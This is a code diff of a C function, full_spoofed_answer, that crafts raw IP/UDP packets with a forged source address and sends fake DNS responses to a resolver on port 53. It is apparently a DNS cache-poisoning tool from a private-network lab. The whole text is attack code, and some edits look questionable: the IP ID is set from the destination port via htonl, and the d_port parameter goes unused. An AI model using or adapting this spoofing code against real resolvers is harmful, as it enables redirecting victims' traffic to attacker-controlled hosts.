@@ -78,7 +78,6 @@ int full_spoofed_answer(uint txid, uint d_port) {
 
     // Parameters
     const char *hostname = "example.com";
-    uint32_t txid = 0x1234;  // Transaction ID
     const char *source_ip = "192.168.1.207";
     const char *dest_ip = "192.168.1.203";
     int dest_port = 53;
@@ -95,39 +94,36 @@ int full_spoofed_answer(uint txid, uint d_port) {
 
     struct sockaddr_in dest;
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(d_port); // Destination port
-    dest.sin_addr.s_addr = inet_addr("192.168.1.203"); // Destination IP
+    dest.sin_port = htons(dest_port);
+    dest.sin_addr.s_addr = inet_addr(dest_ip);
 
     // Fill in the IP header
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + response_len);
-    iph->id = htonl(54321); // Identification
+    iph->id = htonl(dest_port);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_UDP;
-    iph->saddr = inet_addr("192.168.1.207"); // Source IP
+    iph->saddr = inet_addr(source_ip);
     iph->daddr = dest.sin_addr.s_addr;
-    iph->check = 0; // Will calculate later
+    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
 
     // Fill in the UDP header
     udph->source = htons(DNS_PORT);
-    udph->dest = dest.sin_port;
+    udph->dest = htons(dest_port);
     udph->len = htons(sizeof(struct udphdr) + response_len);
     udph->check = 0; // Optional
 
-    // Calculate IP checksum
-    iph->check = checksum((unsigned short *)buffer, ntohs(iph->tot_len));
-
-    // Create raw socket
+    // Create socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
         perror("Socket creation failed");
         return EXIT_FAILURE;
     }
 
-    // Send the DNS response packet
+    // Send DNS response
     if (sendto(sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
         perror("Packet sending failed");
         close(sock);
